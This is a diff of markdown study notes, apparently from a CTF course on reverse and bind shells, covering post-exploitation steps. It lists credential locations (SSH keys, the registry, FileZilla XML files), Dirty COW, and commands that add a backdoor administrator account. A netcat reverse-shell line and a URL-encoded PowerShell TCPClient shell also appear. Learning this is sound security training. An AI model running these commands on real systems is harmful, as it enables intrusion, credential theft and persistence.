@@ -553,25 +553,30 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 
 ## Next Steps
 ### Ok, we have a shell. Now what?
-* The one thing that these all have in common is that shells tend to be unstable and non-interactive.
-* Even Unix style shells which are easier to stabilise are not ideal.
-* On Linux ideally we would be looking for opportunities to gain access to a user account.
-* SSH keys stored at /home/<user>/.ssh are often an ideal way to do this.
-* In CTFs it's also not infrequent to find credentials lying around somewhere on the box.
-* Some exploits will also allow you to add your own account.
-* In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.
-* On Windows the options are often more limited.
-* It's sometimes possible to find passwords for running services in the registry.
-* VNC servers, for example, frequently leave passwords in the registry stored in plaintext.
-* Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml or C:\xampp\FileZilla Server\FileZilla Server.xml.
-* These can be MD5 hashes or in plaintext, depending on the version.
-* Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges.
-* In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.
-* The syntax for this is as follows: net user <username> <password> /add and net localgroup administrators <username> /add
+* Shells tend to be unstable and non-interactive.
+* Looking for opportunities to gain access to a user account on Linux.
+  * SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this.
+  * Some exploits will also allow addition of a new account.
+  * [Dirty C0w](https://dirtycow.ninja/) or a writeable `/etc/shadow` or `/etc/passwd` would quickly give SSH access to the machine.
+* Options are often more limited on Windows.
+  * Sometimes possible to find passwords for running services in the registry.
+    * VNC servers frequently leave passwords in the registry stored in plaintext.
+  * Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`.
+    * These can be MD5 hashes or in plaintext depending on the version.
+  * Ideally want to obtain a shell running as the SYSTEM user or an administrator account running with high privileges.
+    * Possible to add an account (in the administrators group) to the machine.
+```
+net user <username> <password> /add
+```
+```
+net localgroup administrators <username> /add
+```  
+    * Log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods dependent on the services running on the box.
 
 ## The important takeaway
-* Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell.
-* Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.
+* Reverse and Bind shells are an essential technique for gaining remote code execution on a machine.
+  * They will never be as fully featured as a native shell.
+* Always want to escalate into using a 'normal' method for accessing the machine as this will invariably be easier to use for further exploitation of the target.
 
 ## Practice and Examples
 * Try uploading a webshell to the Linux box, then use the command: nc <LOCAL-IP> <PORT> -e /bin/bash to send a reverse shell back to a waiting listener on your own machine.
